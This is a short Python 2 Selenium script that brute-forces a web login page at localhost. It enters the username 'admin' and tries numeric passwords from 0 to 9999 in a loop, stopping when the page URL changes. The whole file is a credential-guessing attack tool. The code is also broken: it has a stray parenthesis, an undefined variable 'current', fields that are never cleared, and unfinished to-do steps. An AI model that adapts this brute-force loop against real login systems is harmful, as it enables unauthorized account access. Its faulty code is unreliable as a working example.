#run_local.py
#by drh4kor
#inception date:2019-2-14

#get reference to the libraries
from selenium import webdriver
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary

#set variables
loginURL='http://localhost/login.html'
binaryPath='/usr/bin/firefox')
#create object
binary = FirefoxBinary(binaryPath)
#create browser
driver = webdriver.Firefox(firefox_binary=binary)
#navigate to log in page
driver.get(loginURL)
#get the textbox to login
inputElement_id = driver.find_element_by_name('login_id')
#get the textbox for password
inputElement_psw = driver.find_element_by_name('login_pwd')
#set the path to the link element does not have id or name property.
pathToLink = '/html/body/table/tbody/tr/td/table/tbody/tr[2]/td/table/tbody/tr[4]/td/table/tbody/tr[2]/td[2]/table/tbody/tr[2]/td/table/tbody/tr[2]/td[2]/table/tbody/tr[5]/td[2]/table/tbody/tr/td/a'
#get the hidden link to use a button to simulate on_click event
inputElement_link = driver.find_element_by_xpath(pathToLink)
#setup counter variables
counter = 0
#setup initial value to test
psw_value=0000
#setup total number of tries
max_value = 10000
#show the current page path
print driver.current_url
#loop start at 0000
for x in range(0, max_value):
    #debug;show the counter
    print "Loop count %d" % (x)
    #simulate keys into the textbox
    inputElement_id.send_keys('admin')
    #todo: format x into '%3d'
    #simulate keys into the textbox
    inputElement_psw.send_keys(x)
    #simulate click on the faux button
    inputElement_link.click()
    #todo:wait for page to load
    #get the url from the page loaded
    newURL = driver.current_url
    #check if it's NOT the same
    if newURL != current: 
	#todo: write to log the test value that passed
        #gtfo
        break	
#cleanup time
driver.close()
